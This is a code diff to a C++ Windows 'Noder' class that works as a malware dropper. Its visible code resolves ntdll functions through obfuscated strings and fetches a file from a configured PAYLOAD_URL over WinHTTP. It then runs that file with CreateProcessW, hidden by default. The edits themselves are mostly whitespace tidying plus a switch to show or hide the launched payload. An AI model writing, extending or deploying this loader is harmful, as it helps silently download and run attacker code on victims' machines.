@@ -10,7 +10,7 @@
 
 #include "noder.h"
 
-Noder::Noder() 
+Noder::Noder()
 {
 	this->Init();
 
@@ -26,7 +26,7 @@ Noder::Noder()
 	this->ExecutePayload();
 }
 
-Noder::~Noder() 
+Noder::~Noder()
 {
 	if (this->LdrUnloadDll == NULL)
 		return;
@@ -98,7 +98,7 @@ bool Noder::LoadLibraries() noexcept
 	return true;
 }
 
-bool Noder::LoadFunctions() noexcept 
+bool Noder::LoadFunctions() noexcept
 {
 	this->LdrUnloadDll = (f_LdrUnloadDll)GetProcAddress(this->ntdll, OBF(char, "LdrUnloadDll"));
 	if (this->LdrUnloadDll == NULL)
@@ -157,11 +157,11 @@ bool Noder::DownloadPayload() noexcept
 		WINHTTP_NO_PROXY_NAME,
 		WINHTTP_NO_PROXY_BYPASS, 0);
 
-	if(hSession)
+	if (hSession)
 		hConnect = this->WinHttpConnect(hSession, PAYLOAD_URL,
 			INTERNET_DEFAULT_HTTPS_PORT, 0);
 
-	if(hConnect)
+	if (hConnect)
 		hRequest = this->WinHttpOpenRequest(hConnect, OBF(wchar_t, L"GET"),
 			PAYLOAD_URL_DEST,
 			NULL, WINHTTP_NO_REFERER,
@@ -173,7 +173,7 @@ bool Noder::DownloadPayload() noexcept
 		0, WINHTTP_NO_REQUEST_DATA, 0,
 		0, 0);
 
-	if(bStatus)
+	if (bStatus)
 		bStatus = this->WinHttpReceiveResponse(hRequest, NULL);
 
 	HANDLE hFile = NULL;
@@ -225,7 +225,7 @@ void Noder::ExecutePayload() noexcept
 	RtlZeroMemory(&si, sizeof(si));
 	si.cb = sizeof(si);
 	RtlZeroMemory(&pi, sizeof(pi));
-	si.dwFlags = SW_HIDE;
+	si.dwFlags = config::hidepayload ? SW_HIDE : SW_SHOW;
 
 	if (CreateProcessW(
 		this->destination.c_str(),
@@ -246,7 +246,7 @@ void Noder::ExecutePayload() noexcept
 		CloseHandle(pi.hThread);
 	}
 
-	
+
 	CleanUp();
 }
 
